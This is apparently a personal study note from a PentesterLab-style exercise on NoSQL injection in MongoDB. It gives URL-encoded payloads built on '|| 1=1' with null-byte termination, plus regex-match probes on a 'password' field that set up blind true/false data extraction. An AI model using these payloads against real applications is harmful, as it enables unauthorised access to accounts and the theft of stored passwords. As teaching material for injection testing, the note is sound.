This is very basic, this is the MongoDB version of the `' or 1=1 --`

We can find that the query that we need to use is:

```sql
|| 1=1
```

and to terminate the string most of the time we use a null byte (`%00`). but sometimes `//` or `<!--` also works.

```ad-note
Don't be an idiot, inject into the username field...
```

# Retrieve additional data

We can make educated guesses, such as there is a password field. Here is how we would test for that:

```
/?search=admin'%20%26%26%20this.password.match(/.*/)%00
```

```ad-note
In practice this didn't work on pentesterlabs 
```


We can see something that’s not an error.
We can then try putting not regex there:

```
/?search=admin'%20%26%26%20this.password.match(/zzzzz/)%00
```

This should give as no results.

Then we can try something that shouldn’t exist:

```
/?search=admin'%20%26%26%20this.passwordzz.match(/.*/)%00
```

and if this gives us an error or something, we can be pretty sure there is a password field.

This gives us a way to perform blind injections, since we have a __true__ state and a __false__ state.
